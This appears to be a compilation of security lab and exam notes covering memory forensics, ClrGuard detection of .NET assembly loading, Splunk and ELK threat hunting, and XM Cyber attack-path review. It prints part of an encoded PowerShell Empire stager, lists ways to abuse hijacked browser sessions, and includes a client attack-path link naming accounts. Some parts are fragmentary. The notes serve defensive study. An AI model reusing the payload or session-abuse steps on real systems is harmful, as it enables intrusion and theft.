+FAGQAZQBuAHQASQBBAGwAcwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHI
+AZQBEAEUATgBUAEkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUARgBhAHUAbAB0AE4ARQBU
+AFcAbwByAEsAQwBSAEUARABFAG4AdABpAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgB
+vAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALg
+BUAEUAWAB0AC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AE
+IAeQB0AEUAUwAoACcAVQAyAHIAIwA7AEcAXwBpAG8AUABsAEEARgBbACwAegBzAFMAWQBq
+ADwATQBUAHEAbQBkACkAdABdAHwAQgAhACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJ
+ABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAE
+oAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0
+AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgB
+dACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQ
+A2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEk
+AXQAs
+
+It looks like a HTA template is probably the source of compromise. Decrypting the Base64
+results in:
+It looks like a PowerShell Empire stager, which is a ﬁrm indication that the machine was
+compromised.
+
+    1. Volatility can display data even from terminated objects (such as network connections)
+    2. Not all injections load a windows executable ﬁle ("MZ" header)
+    3. The strings utility can help identify and extract patterns in memory ﬁles
+
+MEMORY VOLATILITY 2
+
+Task 1. Get familiar with ClrGuard
+Execute ClrGuard.exe as administrator.
+ClrGuard.exe is located at: C:\Users\admin\Desktop\ClrGuard\dist
+You should see the below.
+
+Now, double-click fp.bat.
+fp.bat is located at: C:\Users\admin\Desktop\ClrGuard\Testing\scripts
+You should see the below.
+The module being loaded is whitelisted by ClrGuard. Assembly loading can also be performed
+for legitimate purposes!
+Now, execute the below.
+Click the PowerShell icon that is pinned on the taskbar and execute the below.
+powershell -ep bypass
+cd C:\Users\admin\Desktop\ClrGuard\Testing\scripts
+.\AddTypeRaceCondition.ps1
+
+Note: If you receive the above error, Please re-run all the commands again.
+fp.bat is located at: C:\Users\admin\Desktop\ClrGuard\Testing\scripts
+You should see the below.
+Inside ClrGuard, you should see something similar to the below.
+
+The speciﬁc .net assembly loading was blocked by ClrGuard. Notice that there is no
+"whitelisted" string in the second entry.
+Task 2. Emulate execute-assembly activity and use ClrGuard to proactively detect it
+Let's now better emulate the execute-assembly command/functionality of Cobalt Strike.
+In the scripts directory, there is a PowerShell script called LoadNETAssembly.ps1.
+To execute it, perform the following.
+Click the PowerShell icon that is pinned on the taskbar and execute:
+powershell -ep bypass
+cd C:\Users\admin\Desktop\ClrGuard\Testing\scripts
+.\LoadNETAssembly.ps1
+You should see the below.
+
+Inside ClrGuard you should see something similar to the below.
+Notice that there is no "whitelisted" string in the last entry.
+Note that there are execute-assembly variations included in multiple attacking
+frameworks. The detection method covered doesn't work only against Cobalt Strike.
+
+Advanced Hunting in Splunk
+
+Step 1: Access the Kali machine.
+
+Step 2: Navigate to the following URL to access Splunk:
+URL:
+http://splunk.advanced.local:8000
+
+Go to Search and Reporting.
+
+Step 3: Let's begin our hunt by examining the failed logon events on the SECLOGS machine in
+the Windows Security logs. Make sure to set the time frame to "All time".
+Query:
+index=ecthp source="WinEventLog:Security" EventCode=4625 host=SECLOGS
+Expand to see the event details.
+
+Key Details:
+
+     Event Type: Logon Failure
+
+     Attempted Account: sysoperator
+
+     Failure Reason: Unknown user name or bad password
+
+     Source Host: kali (likely the attacker's machine)
+
+     Source Network Address: - (missing, possibly due to logging limitations)
+
+The targeted account is sysoperator which appears to be a domain account, as the Account
+Domain ﬁeld is research which matches the Active Directory domain name of the instance
+(seclogs.research.SECURITY.local).
+
+Local accounts would display the local machine name (e.g., SECLOGS or CLIENT) as the
+domain, or the domain ﬁeld could be empty instead.
+
+However, if you were to apply a ﬁlter for targeted local accounts only or targeted domain
+accounts only, you would need to construct a query that examines both the Account
+Domain and Account Name ﬁelds under Messsage in each event. Note that in Event ID 4625,
+these ﬁelds appear twice — once under 'Subject:' and once under 'Account For Which Logon
+Failed:'.
+
+Our focus is on the second occurrence of these ﬁelds, speciﬁcally under 'Account For Which
+Logon Failed:'. Because this section shows the actual account the attacker or user attempted
+to log in as — i.e., the targeted account. The ﬁrst occurrence (under Subject:) shows the source
+account initiating the attempt.
+
+Begin by extracting all occurrences of the Account Name and Account Domain ﬁelds from the
+events for more clarity.
+
+Query:
+index=ecthp EventCode=4625 host="SECLOGS"
+| rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)"
+| rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)"
+| table all_users, all_domains
+Explanation:
+index=ecthp EventCode=4625 host="SECLOGS":
+
+     Searches your data in the ecthp index.
+     Filters for Windows Security Event ID 4625, which corresponds to a failed logon attempt.
+     Limits results to the host named SECLOGS.
+rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)":
+     rex is a command used to apply a regular expression (regex) to extract data from a ﬁeld
+
+         — here, from the Message ﬁeld.
+     max_match=0 tells Splunk to ﬁnd all matches, not just the ﬁrst.
+     The pattern is:
+Account Name:\s+(?<all_users>\S+)
+     This matches any string starting with "Account Name:"
+     Followed by one or more spaces (\s+)
+     Followed by a non-space string (\S+) → this is captured in the new ﬁeld called all_users.
+     Because max_match=0, all occurrences of Account Name in the message are captured
+
+         into a multi-value ﬁeld called all_users.
+rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)":
+
+     Does the same thing, but for Account Domain.
+     Captures all domain values into the multi-value ﬁeld all_domains.
+| table all_users, all_domains:
+     Displays the result in a table showing all captured usernames and domains for each
+
+         event.
+     Both all_users and all_domains may show multiple values (e.g., Account Name in
+
+         Subject and in Account For Which Logon Failed).
+We notice that the ﬁrst occurrence of both the Account Name and Account Domain ﬁelds
+shows a hyphen (“-”). The second occurrence of each reveals the correct information. However,
+in few cases, we observe that while the Account Name ﬁeld is present in the second
+occurrence, the corresponding Account Domain ﬁeld is empty — causing the next
+string, “Failure”, to appear in its place.
+
+The string "Failure" is only displayed in the events where domain is empty and the local account
+is targeted.
+Step 4: We have ruled out the ﬁrst occurrence of these ﬁelds. Now, let's display only the second
+occurrence of the Account Name and Account Domain ﬁelds.
+Query:
+index=ecthp EventCode=4625 host="SECLOGS"
+| rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)"
+| rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)"
+| eval target_user=mvindex(all_users, 1)
+| eval target_domain_raw=mvindex(all_domains, 1)
+| table target_user, target_domain_raw
+Explantion (additional ﬁelds):
+eval target_user=mvindex(all_users, 1):
+
+     Extracts the second value (index 1) from the all_users array.
+eval target_domain_raw=mvindex(all_domains, 1):
+
+     Same logic — picks the second value from the all_domains array.
+table target_user, target_domain_raw:
+
+     Creates a table showing just the targeted user and their domain.
+
+Next, let's prepare a query that displays only the local accounts targeted.
+Query:
+index=ecthp EventCode=4625 host="SECLOGS"
+| rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)"
+| rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)"
+| eval target_user=mvindex(all_users, 1)
+| eval target_domain_raw=mvindex(all_domains, 1)
+| eval target_domain=if(like(target_domain_raw, "Failure"), "", target_domain_raw)
+| eval is_local=if(target_domain="" OR target_domain == "SECLOGS", "local", "domain")
+| where is_local="local"
+| table host, target_user, target_domain, Workstation_Name
+Explanation (additional ﬁelds):
+| eval target_domain=if(like(target_domain_raw, "Failure"), "", target_domain_raw)
+
+     Handles noisy/garbled logs where the domain might have the word "Failure" due to
+         unusual formatting.
+
+     If target_domain_raw contains "Failure", it sets target_domain to an empty string.
+| eval is_local=if(target_domain="" OR target_domain == "SECLOGS", "local", "domain")
+
+     Deﬁnes whether the targeted account is local or domain:
+              o If target_domain is empty or equal to the host name (SECLOGS), it is classiﬁed
+                   as local.
+              o Otherwise, it’s a domain account.
+
+| where is_local="local"
+     Filters the results to only show failed logon attempts against local accounts.
+
+| table host, target_user, target_domain, Workstation_Name
+     Displays a table with:
+              o The host (SECLOGS)
+              o Targeted username
+              o Target domain
+              o Workstation name (the system initiating the attempt)
+Similarly, to display only domain accounts targeted in failed login attempts, you just need to
+modify this line:
+| where is_local="local"
+to
+| where is_local!="local"
+In Splunk, != is a comparison operator that means "not equal to."
+This line ﬁlters the results to include only events where the is_local ﬁeld is not equal to "local" —
+i.e., only domain accounts in your case.
+Query:
+index=ecthp EventCode=4625 host="SECLOGS"
+| rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)"
+| rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)"
+| eval target_user=mvindex(all_users, 1)
+| eval target_domain_raw=mvindex(all_domains, 1)
+| eval target_domain=if(like(target_domain_raw, "Failure"), "", target_domain_raw)
+| eval is_local=if(target_domain="" OR target_domain == "SECLOGS", "local", "domain")
+| where is_local!="local"
+| table host, target_user, target_domain, Workstation_Name
+Step 5: Now, let's count the number of failed attempts on each local account and display the
+results in a separate column:
+Query:
+index=ecthp EventCode=4625 host="SECLOGS"
+| rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)"
+| rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)"
+| eval target_user=mvindex(all_users, 1)
+| eval target_domain_raw=mvindex(all_domains, 1)
+| eval target_domain=if(like(target_domain_raw, "Failure"), "", target_domain_raw)
+| eval is_local=if(target_domain="" OR target_domain == "SECLOGS", "local", "domain")
+| where is_local="local"
+| stats count by host, target_user, target_domain, Workstation_Name
+Explanation (additional ﬁelds):
+| stats count by host, target_user, target_domain, Workstation_Name
+
+     Groups the results by:
+              o host
+              o target_user (username that failed)
+              o target_domain
+              o Workstation_Name (originating machine)
+So, there have been a total of 18 failed login attempts targeting the local user
+account secadmin.
+Similarly to count the number of failed attempts on each domain account and display the
+results in a separate column:
+Query:
+index=ecthp EventCode=4625 host="SECLOGS"
+| rex ﬁeld=Message max_match=0 "Account Name:\s+(?<all_users>\S+)"
+| rex ﬁeld=Message max_match=0 "Account Domain:\s+(?<all_domains>\S+)"
+| eval target_user=mvindex(all_users, 1)
+| eval target_domain_raw=mvindex(all_domains, 1)
+| eval target_domain=if(like(target_domain_raw, "Failure"), "", target_domain_raw)
+| eval is_local=if(target_domain="" OR target_domain == "SECLOGS", "local", "domain")
+| where is_local!="local"
+| stats count by host, target_user, target_domain, Workstation_Name
+
+So, there have been a total of 17 failed login attempts targeting the domain account sysoperator.
+Step 6: Next, we’ll investigate and identify the malicious service created by the attacker on the
+SECLOGS machine.
+Query:
+index=ecthp LogName="Microsoft-Windows-Sysmon/Operational" EventCode=12
+host=SECLOGS EventType=CreateKey
+TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*"
+| table _time, host, User, Image, TargetObject, EventType
+| sort -_time
+This query is designed to identify registry key creation events related to Windows services — a
+common technique used for persistence by attackers.
+Explanation:
+index=ecthp LogName="Microsoft-Windows-Sysmon/Operational"
+
+     Searches within the Splunk index named ecthp. Filters for logs speciﬁcally from
+         the Sysmon Operational log.
+
+EventCode=12
+     Filters for Event ID 12, which in Sysmon means:
+              o Registry key creation (i.e., CreateKey).
+
+host=SECLOGS
+     Limits the search to the SECLOGS host (the monitored machine)
+
+EventType=CreateKey
+     Adds another ﬁlter to conﬁrm that the type of action was creating a registry key.
+
+TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*"
+     Narrows down to registry keys created under the Windows Services path, which is:
+
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\
+     This is a critical location: Windows uses it to deﬁne system services and their behavior
+         (such as what binary to execute at boot).
+
+| table _time, host, User, Image, TargetObject, EventType
+     Selects and displays only the following ﬁelds in a clean table:
+              o _time: When the event occurred
+              o host: The machine name (SECLOGS)
+              o User: Which user created the key
+              o Image: The executable that performed the action
+              o TargetObject: The exact registry key that was created
+              o EventType: Should always be CreateKey in this case
+
+| sort -_time
+     Sorts the ﬁnal output in reverse chronological order (newest events ﬁrst).
+At 10:41:59 AM on June 23, 2025, a new registry key was created under:
+HKLM\System\CurrentControlSet\Services\FunnyService
+This is a key part of how Windows services are registered. The event indicates that a suspicious
+service named FunnyService was likely being installed or set up.
+Next, check Event ID 13 in Sysmon.
+Query:
+index=ecthp LogName="Microsoft-Windows-Sysmon/Operational" EventCode=13
+host="SECLOGS"
+TargetObject="HKLM\\System\\CurrentControlSet\\Services\\FunnyService\\*"
+| table TargetObject, Details
+Explanation:
+EventCode=13
+
+     This is Sysmon Event ID 13, which means:
+              o A registry value was set.
+
+     It's triggered when a value (not a key) in the registry is modiﬁed or created — for
+         example, setting the ImagePath for a Windows service.
+
+TargetObject="HKLM\\System\\CurrentControlSet\\Services\\FunnyService\\*"
+     Filters to show only registry value modiﬁcations inside the FunnyService registry key
+         (which deﬁnes a custom or malicious Windows service).
+     The * wildcard matches any subkey or value name under that path (like ImagePath,
+         Start, etc.).
+
+| table TargetObject, Details
+     This formats the output as a table with:
+              o TargetObject: The full registry path and value name that was modiﬁed.
+              o Details: The new value that was set, such as the executable path for the service.
+Registry Key Path and Meaning:
+HKLM\System\CurrentControlSet\Services\FunnyService\ObjectName
+
+     Details: LocalSystem
+     This means the service runs under the LocalSystem account, which has very high
+
+         privileges.
+...FunnyService\DisplayName
+Details: Windows Updates
+
+     This is a deceptive display name. It pretends to be a legitimate system service.
+...FunnyService\ImagePath
+
+     Details: C:\Users\Public\reverse.exe
+     This is the path to the binary that will run when the service starts. In this case, it's a
+
+         suspicious executable, likely a reverse shell or malware.
+...FunnyService\ErrorControl
+
+     Details: DWORD (0x00000001)
+     Indicates how the system responds if the service fails to start:
+
+              o 0x1 means the system logs the error but continues with startup
+...FunnyService\Start
+
+     Details: DWORD (0x00000002)
+     Indicates automatic startup during system boot.
+
+              o 0x2 = Auto Start.
+...FunnyService\Type
+
+     Details: DWORD (0x00000010)
+     This denotes the service type:
+
+              o 0x10 = User-mode service that runs in its own process (not shared with other
+                   services).
+This indicates that an attacker or malware created a persistent Windows service named
+FunnyService:
+
+     Disguised as a system update (Windows Updates),
+     Runs a suspicious binary (reverse.exe) from a public folder,
+     Starts automatically at boot with high privileges.
+     This is a classic persistence technique used by attackers.
+The same can be observed in the Windows System logs:
+Query:
+index=ecthp EventCode=7045 source="WinEventLog:System" host="SECLOGS"
+| table _time, host, ComputerName, Message
+
+Step 7: To ﬁnd out all websites visited via Internet Explorer (IE) on the SECLOGS machine by a
+user, we can use the following query:
+Query:
+index=ecthp LogName="Microsoft-Windows-Sysmon/Operational" EventCode=22
+Image="C:\\Program Files\\Internet Explorer\\iexplore.exe"
+| table _time, host, User, Image, QueryName, QueryStatus
+| sort -_time User
+Explanation:
+EventCode=22: Sysmon Event ID 22 is for DNS query events.
+Image="C:\Program Files\Internet Explorer\iexplore.exe": Only DNS queries made by Internet
+Explorer are shown.
+| table _time, host, User, Image, QueryName, QueryStatus
+
+     This selects and displays:
+              o _time: When the DNS query occurred.
+              o host: The system where the query happened.
+              o User: The user account under which the process ran.
+              o Image: The executable making the DNS query.
+              o QueryName: The actual domain name being queried (e.g., malicious-site.com).
+              o QueryStatus: Whether the DNS query was successful or not (e.g., 0 = Success).
+| sort -_time User
+     _time: Sorts by _time in descending order (most recent ﬁrst).
+     User: Sorts alphabetically within each timestamp if multiple users have events at the
+         same time.
+This Splunk query analyses DNS query activity using Sysmon Event ID 22, speciﬁcally made by
+Internet Explorer (iexplore.exe).
+Since, most website visits start with a DNS query to resolve the domain name, this query gives a
+list of domains the browser tried to access.
+
+We see numerous events. Notable ones include visits to the following websites made by
+the secadmin user. Assuming that the compromised user on this machine had logged on to
+these web services and opted to stay logged in, browser-stored cookies may still be valid. In that
+case, attacker can do the following:
+
+     amazon.com
+              o Hijack the session to access order history, stored cards, or pivot to AWS services
+                   for infrastructure abuse.
+
+     netﬂix.com
+              o Access watch history to proﬁle user interests.
+
+     dropbox.com
+              o Access, upload, or sync malicious ﬁles through the user's cloud storage for
+                   persistence or data theft.
+
+     drive.google.com
+              o Steal or plant sensitive documents, search for passwords, and abuse shared
+                   folders to pivot laterally.
+
+Additionally,
+
+     wetransfer.com
+
+              o Silently exﬁltrate sensitive ﬁles using the trusted user’s session without raising
+                   suspicion.
+
+     pastebin.com
+
+              o Post stolen data or C2 commands to evade attribution and monitoring.
+
+Conclusion
+
+In this lab, we focused on building complex and sophisticated Splunk queries to analyze
+Windows Security, System, and Sysmon logs. The objective was to understand how to extract
+meaningful insights from raw log data by writing precise, multi-step queries. This approach
+enabled us to trace attacker behavior, detect anomalies, and uncover persistence mechanisms.
+This lab highlights how powerful and ﬂexible Splunk can be when used to craft tailored searches
+for advanced threat detection and investigation.
+
+References
+
+- https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/
+Advanced Hunting in ELK
+
+URL:
+http://elk.advanced.local:5601
+
+Go to Discover.
+Set the time frame to "Last 1 year" or any other relevant range.
+Step 3: Let's begin our investigation. Any registry-based persistence via Winlogon involving
+PowerShell can be identiﬁed using the following query:
+Query:
+winlog.channel:"Microsoft-Windows-Sysmon/Operational"
+AND winlog.event_id:13
+AND winlog.event_data.TargetObject.keyword:*\\Winlogon\\*
+AND winlog.event_data.Image:*powershell.exe
+Explanation:
+winlog.channel:"Microsoft-Windows-Sysmon/Operational":
+
+     Filters logs from Sysmon.
+     Ensures only events from the Sysmon/Operational channel are returned.
+winlog.event_id:13:
+     Filters for Sysmon Event ID 13, which logs registry value set operations.
+     Triggered when a process modiﬁes a registry key's value.
+winlog.event_data.TargetObject.keyword:*\\Winlogon\\*:
+     Narrows down results to registry modiﬁcations under the Winlogon key.
+     Winlogon is a critical registry path used during user logon — often targeted for
+
+         persistence by attackers.
+winlog.event_data.Image:*powershell.exe:
+
+     Filters events where the process responsible for the registry change is powershell.exe.
+     Indicates that PowerShell (commonly abused in attacks) made the modiﬁcation.
+We have found an event. Expand it to see the details.
+
+Key Observations:
+     This event shows that powershell.exe modiﬁed the Userinit key registry value under
+         the Winlogon key. The Userinit key speciﬁes the program(s) to run automatically after a
+         user logs in to Windows.
+     The default path userinit.exe was appended with a suspicious executable
+         (backdoor.exe), which suggests an attempt to establish persistence.
+     The action was performed under the user SRV-ECTHP\itadmin, possibly indicating
+         privilege misuse or compromise.
+
+Step 4: To identify logon attempts made by explicitly specifying credentials, look for Event ID
+4648 in the Security logs.
+Query:
+winlog.channel:"Security" AND winlog.event_id:4648
+Check the latest event.
+
+This indicates that the itadmin account attempted to log on locally using the credentials of
+the hacker$ machine account. A machine account name is usually followed by a $ sign.
+Let's see if we can ﬁnd other events where this machine account is involved.
+Query:
+message: "*hacker$*"
+Check the earliest event.
+
+Key Observations:
+     This is a Sysmon Event ID 1 — Process Creation. This event shows that
+         the itadmin account executed a PowerShell command that launched net.exe to create a
+         new user account named hacker$ with the password hacker@123.
+     Username ends in $ – unusual for user accounts. In Active Directory, names ending
+         with $ typically refer to machine accounts.
+     Creating a user account named hacker$:
+              o Looks like an attempt to blend in with legitimate system accounts.
+              o May be a trick to avoid detection by admins or security tools ﬁltering out user-
+                   only accounts.
+              o Suggests intent to deceive and hide the account in plain sight.
+
+Next, review the second event from the top.
+Key Observations:
+
+     This event shows that the account hacker$ successfully logged in locally. The logon was
+         initiated by itadmin using explicit credentials.
+
+     Note the SID of the hacker$ account: S-1-5-21-3688751335-3073641799-161370460-
+         500. The SID ending in 500 assigned to hacker$ is highly suspicious. In Windows, the RID
+         (Relative Identiﬁer) 500 is reserved exclusively for the built-in Administrator account.
+         What we have encountered is a classic case of RID Hijacking.
+
+What is RID Hijacking?
+
+RID Hijacking (Relative Identiﬁer Hijacking) is a post-exploitation technique where an attacker:
+
+    1. Creates a new user account (e.g., hacker$)
+
+    2. Modiﬁes the account’s RID in the Windows registry to match that of a high-privileged
+         account — usually the built-in Administrator account (RID 500)
+
+    3. The result:
+
+    4. The attacker-controlled user inherits all privileges of the Administrator.
+    5. But the name, creation time, and activity trail show a non-privileged-looking account.
+So, RID Hijacking was likely performed in this system. The attacker created a new account
+named hacker$ and altered its RID to 500, which is normally reserved for the built-in
+Administrator account. This allowed the attacker to gain full administrative privileges while
+hiding under a non-default account name, evading detection by conventional monitoring tools.
+Step 5: To check the DLLs loaded by a process, we need to refer to Sysmon Event ID 7.
+Query:
+winlog.channel:"Microsoft-Windows-Sysmon/Operational"
+AND winlog.event_id:7
+AND message:*SignatureStatus*
+AND NOT message:"SignatureStatus: Valid"
+Explantion:
+winlog.event_id:7
+
+     Retrieves Sysmon Event ID 7 – Image Loaded.
+     Triggered when a process loads a DLL or executable into its address space.
+message:*SignatureStatus*
+     Ensures the log contains a code signature check result.
+NOT message:"SignatureStatus: Valid"
+     Filters out binaries or DLLs with valid digital signatures.
+     Returns only binaries or DLLs with invalid, missing, expired tampered signatures.
+This query identiﬁes processes that load unsigned or suspiciously signed binaries/DLLs. By
+ﬁltering Sysmon Event ID 7 logs where SignatureStatus is not "Valid", it helps detect the use of
+potentially malicious or tampered DLLs/binaries.
+We notice a suspicious event with the timestamp - Jun 25, 2025 16:01:59.906.
+
+This event recorded a process (in this case, calc.exe) loading a DLL into memory —
+here, wininet.dll.
+
+Why This Is Suspicious?
+
+    1. DLL Sideloading Technique
+
+    2. wininet.dll is a legitimate Windows DLL usually found in C:\Windows\System32\.
+
+    3. But here, it’s located in C:\Utilities\ — a non-standard path, suggesting it may be a
+         malicious copy or modiﬁed version.
+
+    4. Unsigned DLL
+
+    5. Signed: false and SignatureStatus: Unavailable → Windows couldn't verify the DLL's
+         signature.
+
+What is DLL Sideloading?
+
+DLL Sideloading is a stealthy attack technique where an attacker places a malicious DLL in the
+same directory as a legitimate signed executable, so that the executable unknowingly loads the
+attacker's DLL.
+To determine if the DLL is actually malicious, copy the MD5 hash of the DLL from the Sysmon
+event and check it on VirusTotal.
+MD5 Hash: D4990A8D2FF6F2433ACDAD04521F85C6
+
+Various security vendors have ﬂagged this DLL as malicious!
+Step 6: Next, critical settings that can signiﬁcantly impact security include domain policy
+conﬁgurations and ﬁrewall settings.
+Query:
+winlog.channel:"Security" AND (winlog.event_id:4739 OR winlog.event_id:4950)
+This query is designed to ﬁlter Windows Security logs to show only events with:
+
+     Event ID 4739 – A domain policy was modiﬁed
+     Event ID 4950 – A Windows Firewall setting has changed (Windows Filtering Platform)
+We can see some events. To see only the message ﬁeld in the events, add the message ﬁeld as
+a column.
+
+Notice that the ﬁrewall was disabled for all proﬁles — Private, Public, and Domain.
+Additionally, a domain policy was changed. Expand it to see more details.
+
+Speciﬁcally, the Lockout Policy was modiﬁed. The Lockout Threshold was changed to 0,
+meaning account lockouts are now disabled.
+The attacker disabled the Windows ﬁrewall across all proﬁles and modiﬁed domain lockout
+policies to allow unlimited login attempts. These changes signiﬁcantly reduce the system’s
+defensive posture, facilitating stealthy brute-force attacks, lateral movement, and long-term
+persistence. This activity strongly indicates post-compromise behavior aimed at evading
+detection and maintaining control over the environment.
+
+Conclusion
+
+This lab uncovered a sequence of post-exploitation activities that demonstrate how attackers
+can establish persistence, evade detection, and weaken an enterprise’s defensive posture once
+inside a compromised environment.
+
+Key attacks observed included:
+
+Userinit Key Tampering — modifying the registry to execute a backdoor during user logon.
+
+RID Hijacking — impersonating privileged accounts by manipulating security identiﬁers.
+
+DLL Sideloading — using a trusted executable to load a malicious DLL from a non-standard
+path.
+
+Domain Policy Tampering — disabling account lockouts to facilitate brute-force attacks.
+
+Firewall Disabling — removing host-level protections to allow unrestricted remote access.
+
+These techniques reﬂect advanced adversary behavior aimed at persistence, privilege
+escalation, and stealth.
+
+References
+
+     https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/
+
+     https://www.virustotal.com/gui/home/search
+NOTES EXAM
+XMCYBER
+
+Proactivo
+
+Saca una puntuación en base a los escenarios
+
+En esa pestaña te muestra el killchain del escenario creado
+Aquí en la ruleta de la derecha te deja cambiar la visualización y ves mejor el ataque.
+
+Aquí parece que son vulnerabilidades sueltas y cuantos assets afecta tecnicas
+Se puede hacer un ticket para gestionar la vuln
+Crear escenarios
+Aquí por lo visto cuentas
+Esto parece el resultado
+Aquí parece que esta el killchain de la nube
+Resumen de vulns
+Aquí para tener una alerta de las cosas nuevas que salen o ocurren
+Sensores
+Aquí ordenadores desconectados?
+No me cuadra que hay algunos con la 1.43 y otros or la 1.47 y este activado lo de auto-update y
+no se actualize ( necesitas reinicar la maquina)
+Sacamos la lista
+Ordenadores que necesita una actualizacion de version sera del agente
+
+Inventori
+
+Aquí en esa parte porque el riesgo de hacer una querie para AI?
+Aquí se pueden hacer etiquetas
+Aquí hay que aplicar etiquetas algunas no se ponen
+BattleGround
+
+Users
+
+Setup_mxstores
+https://tendam.clients.xmcyber.com/#/battleground/00000011000174?chokePointsMode=fals
+e&clusterBy=ouUser&includeDeadEnds=true&node=activeDirectoryUser-S-1-5-21-408037480-
+608305736-1734353810-87285&showAuxiliaryEvents=true&vectorMapMode=true
+Si se compromete la maquina y se consigue desde esta el TGT de storescortel ﬁel
+setup_mxstores puedes resetear la pass del 51809
+Es un admuser
+Veriﬁcar la pass de ese user
+Implentar alta complejidad de contraseña
+Implementar MFA
+Implementar NTLV2
+
+Ope28474
+Tareas
+
+1 Aplicar las etiquetas ( según nivel de usuario)
+1 Aplicar los usurios
+
